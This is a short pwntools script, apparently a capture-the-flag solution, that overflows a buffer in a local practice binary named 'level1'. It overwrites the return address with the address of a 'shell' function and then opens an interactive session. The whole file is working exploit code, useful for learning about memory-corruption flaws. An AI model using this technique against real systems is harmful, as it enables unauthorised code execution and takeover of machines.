#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2019 vam <jpwan21@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *

r = process("./level1")

r.recvline()

shell = 0x080484CB
payload = 'a'*9 + 'a'*4 + p32(shell)

r.sendline(payload)
r.interactive()
